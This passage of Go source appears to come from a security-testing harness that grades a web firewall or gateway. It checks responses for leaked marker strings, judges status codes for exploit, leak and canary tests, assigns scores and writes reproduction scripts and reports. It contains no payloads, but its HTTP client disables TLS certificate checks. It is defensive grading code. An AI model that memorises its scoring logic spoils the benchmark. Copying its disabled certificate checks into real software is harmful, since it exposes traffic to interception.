		if found, location := markerInResponse(body, headers, marker); found {
			return true, location, marker, "fallback"
		}
	}

	return false, "not_found", "", "none"
}

func isContractMarker(marker string) bool {
	marker = strings.TrimSpace(marker)
	if marker == "" {
		return false
	}
	return markerContractRegex.MatchString(marker)
}

func markerPresenceInResponse(body string, headers map[string]string, marker string) (bool, bool) {
	if marker == "" {
		return false, false
	}

	foundInBody := strings.Contains(body, marker)
	foundInHeader := false
	for _, v := range headers {
		if strings.Contains(v, marker) {
			foundInHeader = true
			break
		}
	}

	return foundInBody, foundInHeader
}

func markerInResponse(body string, headers map[string]string, marker string) (bool, string) {
	if marker == "" {
		return false, "not_applicable"
	}

	foundInBody, foundInHeader := markerPresenceInResponse(body, headers, marker)
	if foundInBody {
		return true, "body"
	}
	if foundInHeader {
		headerKeys := make([]string, 0, len(headers))
		for k := range headers {
			headerKeys = append(headerKeys, k)
		}
		sort.Strings(headerKeys)
		for _, k := range headerKeys {
			if strings.Contains(headers[k], marker) {
				return true, fmt.Sprintf("header:%s", k)
			}
		}
		return true, "header"
	}

	return false, "not_found"
}

func detectMainAndOtherMarkers(body string, headers map[string]string, mainMarker string) (bool, string, bool, string, string) {
	mainMarker = strings.TrimSpace(mainMarker)
	if mainMarker != "" {
		if found, location := markerInResponse(body, headers, mainMarker); found {
			return true, location, false, "", "not_found"
		}
	}

	for _, marker := range otherExpectedMarkerRegex.FindAllString(body, -1) {
		if marker == mainMarker {
			continue
		}
		return false, "not_found", true, marker, "body"
	}

	headerKeys := make([]string, 0, len(headers))
	for k := range headers {
		headerKeys = append(headerKeys, k)
	}
	sort.Strings(headerKeys)
	for _, k := range headerKeys {
		for _, marker := range otherExpectedMarkerRegex.FindAllString(headers[k], -1) {
			if marker == mainMarker {
				continue
			}
			return false, "not_found", true, marker, fmt.Sprintf("header:%s", k)
		}
	}

	return false, "not_found", false, "", "not_found"
}

func reconcileMarkerSignals(result *DetailedResult) {
	mainMarker := strings.TrimSpace(result.MarkerExpected)

	if !result.MainMarkerFound && mainMarker != "" {
		if found, location := markerInExtendedResponse(result.ResponseBody, result.ResponseHeaders, result.FullResponse, result.RawResponse, mainMarker); found {
			result.MainMarkerFound = true
			result.MainMarkerLocation = location
		}
	}

	if !result.OtherMarkerFound {
		if found, marker, location := detectOtherMarkerInExtendedResponse(result.ResponseBody, result.ResponseHeaders, result.FullResponse, result.RawResponse, mainMarker); found {
			result.OtherMarkerFound = true
			result.OtherMarker = marker
			result.OtherMarkerLocation = location
		}
	}

	result.MarkerFound = result.MainMarkerFound || result.OtherMarkerFound
	if result.MainMarkerFound {
		result.MarkerLocation = result.MainMarkerLocation
		result.MatchedMarker = mainMarker
		result.MarkerMatchType = "main"
	} else if result.OtherMarkerFound {
		result.MarkerLocation = result.OtherMarkerLocation
		result.MatchedMarker = result.OtherMarker
		result.MarkerMatchType = "fallback"
	} else {
		result.MarkerLocation = "not_found"
		result.MatchedMarker = ""
		result.MarkerMatchType = "none"
	}

	markerToLocate := result.MatchedMarker
	foundInBody, foundInHeader := markerPresenceInResponse(result.ResponseBody, result.ResponseHeaders, markerToLocate)
	result.MarkerFoundInBody = foundInBody
	result.MarkerFoundInHeader = foundInHeader
}

func markerInExtendedResponse(body string, headers map[string]string, fullResponse string, rawResponse string, marker string) (bool, string) {
	if found, location := markerInResponse(body, headers, marker); found {
		return true, location
	}
	if marker != "" && strings.Contains(fullResponse, marker) {
		return true, "full_response"
	}
	if marker != "" && strings.Contains(rawResponse, marker) {
		return true, "raw_response"
	}
	return false, "not_found"
}

func detectOtherMarkerInExtendedResponse(body string, headers map[string]string, fullResponse string, rawResponse string, mainMarker string) (bool, string, string) {
	mainMarker = strings.TrimSpace(mainMarker)

	_, _, otherFound, otherMarker, otherLocation := detectMainAndOtherMarkers(body, headers, mainMarker)
	if otherFound {
		return true, otherMarker, otherLocation
	}

	otherInText := func(text string, location string) (bool, string, string) {
		for _, marker := range otherExpectedMarkerRegex.FindAllString(text, -1) {
			if marker == mainMarker {
				continue
			}
			return true, marker, location
		}
		return false, "", "not_found"
	}

	if found, marker, location := otherInText(fullResponse, "full_response"); found {
		return true, marker, location
	}
	if found, marker, location := otherInText(rawResponse, "raw_response"); found {
		return true, marker, location
	}

	return false, "", "not_found"
}

func getOtherExpectedMarkers(def TestDefinition, mainMarker string) []string {
	defs := GetTestDefinitions()
	seen := make(map[string]bool)
	markers := make([]string, 0, len(defs))

	for _, d := range defs {
		m := strings.TrimSpace(d.Marker)
		if m == "" || m == mainMarker || seen[m] {
			continue
		}
		seen[m] = true
		markers = append(markers, m)
	}

	return markers
}

func resolveRequestPath(def TestDefinition, variant string) string {
	switch def.ID {
	case "V06", "V07":
		if strings.HasPrefix(variant, "/") {
			return variant
		}
		return "/static/" + strings.TrimPrefix(variant, "/")
	default:
		if def.Path != "" {
			return def.Path
		}
		return "/"
	}
}

func isBlockedStatus(status int) bool {
	switch status {
	case 403, 406, 429, 500, 501, 503:
		return true
	default:
		return false
	}
}

func isExploitSanitizedStatus(status int) bool {
	switch status {
	case 200, 201, 202, 204:
		return true
	default:
		return false
	}
}

func evaluateStatusContract(def TestDefinition, status int) (bool, string) {
	category := strings.ToLower(strings.TrimSpace(def.Category))

	switch category {
	case "canary":
		if isBlockedStatus(status) {
			return true, fmt.Sprintf("canary blocked status accepted (%d)", status)
		}
		return false, fmt.Sprintf("canary requires blocked status, got %d", status)
	case "leak":
		if (status >= 200 && status < 300) || isBlockedStatus(status) {
			return true, fmt.Sprintf("leak status accepted (%d)", status)
		}
		return false, fmt.Sprintf("leak test status out of accepted range: %d", status)
	default:
		if isBlockedStatus(status) {
			return true, fmt.Sprintf("exploit blocked status accepted (%d)", status)
		}
		if isExploitSanitizedStatus(status) {
			return true, fmt.Sprintf("exploit sanitized status accepted (%d)", status)
		}
		return false, fmt.Sprintf("exploit test requires blocked or sanitized status, got %d", status)
	}
}

// Evaluate test result
func evaluateTestResult(def TestDefinition, result DetailedResult) bool {
	// Global rule: any known marker exposure (main or other) means failure.
	if result.MarkerFound {
		return false
	}

	statusCompliant, _ := evaluateStatusContract(def, result.ResponseStatus)
	return statusCompliant
}

// Get max score based on test ID
// Scoring per scoring_matrix.csv:
//   SEC-01: V01-V24 exploit prevention = 15 points (across all V tests)
//   SEC-02: L01-L05 outbound filtering = 5 points
//   SEC-04: Canary detection = 2 points (all-or-nothing for 4 canaries)
func getMaxScoreForTest(testID string) float64 {
	// Count unique test IDs by category for fair distribution
	// V tests: V01-V11, V14-V16, V19-V24 = 20 unique IDs -> 15/20 = 0.75 per test
	// L tests: L01-L05 = 5 unique IDs -> 5/5 = 1.0 per test
	// Canary: 4 endpoints -> 2/4 = 0.5 per canary

	if strings.HasPrefix(testID, "V") {
		return 15.0 / 20.0 // 0.75 per V test
	}
	if strings.HasPrefix(testID, "L") {
		return 5.0 / 5.0 // 1.0 per L test
	}
	if strings.HasPrefix(testID, "CANARY") {
		return 2.0 / 4.0 // 0.5 per canary
	}
	return 0.5
}

// Calculate summary statistics
func (ts *TestSuiteResults) calculateSummary() {
	totalScore := 0.0
	maxScore := 0.0
	passed := 0
	failed := 0

	categoryMap := make(map[string]*CategoryScore)

	for _, r := range ts.Results {
		totalScore += r.Score
		maxScore += r.MaxScore

		if r.Passed {
			passed++
		} else {
			failed++
		}

		// Category tracking
		cat, exists := categoryMap[r.Category]
		if !exists {
			cat = &CategoryScore{Category: r.Category}
			categoryMap[r.Category] = cat
		}
		cat.Total++
		if r.Passed {
			cat.Passed++
		}
		cat.Score += r.Score
		cat.MaxScore += r.MaxScore
	}

	// Calculate percentages
	for _, cat := range categoryMap {
		if cat.MaxScore > 0 {
			cat.Percentage = (cat.Score / cat.MaxScore) * 100
		}
		ts.Summary.CategoryScores[cat.Category] = *cat
	}

	ts.Summary.TotalTests = len(ts.Results)
	ts.Summary.Passed = passed
	ts.Summary.Failed = failed
	ts.Summary.TotalScore = totalScore
	ts.Summary.MaxPossibleScore = maxScore
	if maxScore > 0 {
		ts.Summary.Percentage = (totalScore / maxScore) * 100
	}
}

// CreateHTTPClient with proper settings
func CreateHTTPClient() *http.Client {
	jar, _ := cookiejar.New(nil)
	return &http.Client{
		Timeout: 30 * time.Second,
		Jar:     jar,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableCompression: false,
		},
	}
}

func requestBodyBytes(req *http.Request) ([]byte, error) {
	if req == nil || req.Body == nil {
		return nil, nil
	}

	if req.GetBody != nil {
		rc, err := req.GetBody()
		if err != nil {
			return nil, err
		}
		defer rc.Close()
		return io.ReadAll(rc)
	}

	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		return nil, err
	}
	req.Body = io.NopCloser(bytes.NewReader(bodyBytes))
	return bodyBytes, nil
}

func sanitizeHeaderValue(v string) string {
	v = strings.ReplaceAll(v, "\r", "\\r")
	v = strings.ReplaceAll(v, "\n", "\\n")
	return v
}

func dumpRequestWire(req *http.Request) (string, error) {
	if req == nil {
		return "", fmt.Errorf("nil request")
	}

	bodyBytes, err := requestBodyBytes(req)
	if err != nil {
		return "", err
	}

	path := req.URL.RequestURI()
	if path == "" {
		path = "/"
	}
	proto := req.Proto
	if proto == "" {
		proto = "HTTP/1.1"
	}

	var b strings.Builder
	b.WriteString(req.Method)
	b.WriteString(" ")
	b.WriteString(path)
	b.WriteString(" ")
	b.WriteString(proto)
	b.WriteString("\r\n")

	host := req.Host
	if host == "" && req.URL != nil {
		host = req.URL.Host
	}
	if host != "" {
		b.WriteString("Host: ")
		b.WriteString(sanitizeHeaderValue(host))
		b.WriteString("\r\n")
	}

	headerKeys := make([]string, 0, len(req.Header))
	for k := range req.Header {
		if strings.EqualFold(k, "Host") {
			continue
		}
		headerKeys = append(headerKeys, k)
	}
	sort.Strings(headerKeys)

	hasContentLength := false
	for _, k := range headerKeys {
		if strings.EqualFold(k, "Content-Length") {
			hasContentLength = true
		}
		for _, v := range req.Header.Values(k) {
			b.WriteString(k)
			b.WriteString(": ")
			b.WriteString(sanitizeHeaderValue(v))
			b.WriteString("\r\n")
		}
	}

	if len(bodyBytes) > 0 && !hasContentLength && len(req.TransferEncoding) == 0 {
		b.WriteString("Content-Length: ")
		b.WriteString(strconv.Itoa(len(bodyBytes)))
		b.WriteString("\r\n")
	}

	b.WriteString("\r\n")
	if len(bodyBytes) > 0 {
		b.Write(bodyBytes)
	}

	return b.String(), nil
}

func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}

// Generate curl command for reproduction based on the exact request metadata.
func generateCurlCommand(req *http.Request, bodyBytes []byte) string {
	if req == nil {
		return "curl -s"
	}

	parts := []string{"curl", "-s", "-X", req.Method}

	host := req.Host
	if host == "" && req.URL != nil {
		host = req.URL.Host
	}
	if host != "" {
		parts = append(parts, "-H", shellQuote("Host: "+sanitizeHeaderValue(host)))
	}

	headerKeys := make([]string, 0, len(req.Header))
	for k := range req.Header {
		if strings.EqualFold(k, "Host") {
			continue
		}
		headerKeys = append(headerKeys, k)
	}
	sort.Strings(headerKeys)
	for _, k := range headerKeys {
		for _, v := range req.Header.Values(k) {
			parts = append(parts, "-H", shellQuote(k+": "+sanitizeHeaderValue(v)))
		}
	}

	if len(bodyBytes) > 0 {
		parts = append(parts, "--data-binary", shellQuote(string(bodyBytes)))
	}

	if req.URL != nil {
		parts = append(parts, shellQuote(req.URL.String()))
	}

	return strings.Join(parts, " ")
}

func generateReproductionScript(req *http.Request, bodyBytes []byte) string {
	if req == nil || req.URL == nil {
		return "# reproduction unavailable: request not captured"
	}

	host := req.Host
	if host == "" {
		host = req.URL.Host
	}

	headerKeys := make([]string, 0, len(req.Header))
	for k := range req.Header {
		if strings.EqualFold(k, "Host") {
			continue
		}
		headerKeys = append(headerKeys, k)
	}
	sort.Strings(headerKeys)

	headerPairs := make([]string, 0, len(headerKeys)+1)
	if host != "" {
		headerPairs = append(headerPairs, fmt.Sprintf("    %q: %q,", "Host", sanitizeHeaderValue(host)))
	}
	for _, k := range headerKeys {
		for _, v := range req.Header.Values(k) {
			headerPairs = append(headerPairs, fmt.Sprintf("    %q: %q,", k, sanitizeHeaderValue(v)))
		}
	}

	bodyLiteral := "None"
	if len(bodyBytes) > 0 {
		bodyLiteral = strconv.Quote(string(bodyBytes))
	}

	python := "# Python requests reproduction\n" +
		"import requests\n\n" +
		"url = " + strconv.Quote(req.URL.String()) + "\n" +
		"method = " + strconv.Quote(req.Method) + "\n" +
		"headers = {\n" + strings.Join(headerPairs, "\n") + "\n}\n" +
		"data = " + bodyLiteral + "\n\n" +
		"resp = requests.request(method, url, headers=headers, data=data, timeout=30, verify=False)\n" +
		"print(resp.status_code)\n" +
		"print(resp.headers)\n" +
		"print(resp.text)\n"

	httpReq, err := dumpRequestWire(req)
	if err != nil {
		httpReq = "# failed to render .http/raw request: " + err.Error()
	}

	return python + "\n\n### .http / raw HTTP reproduction\n" + httpReq
}

// GenerateEnhancedHTMLReport creates a comprehensive HTML report using modern UI
func (ts *TestSuiteResults) GenerateEnhancedHTMLReport(outputPath string) error {
	html := generateHTMLTemplate(ts)

	dir := filepath.Dir(outputPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create report directory: %v", err)
	}

	return os.WriteFile(outputPath, []byte(html), 0644)
}

// Generate JSON report
func (ts *TestSuiteResults) GenerateJSONReport(outputPath string) error {
	jsonData, err := json.MarshalIndent(ts, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %v", err)
	}

	dir := filepath.Dir(outputPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create report directory: %v", err)
	}

	return os.WriteFile(outputPath, jsonData, 0644)
}
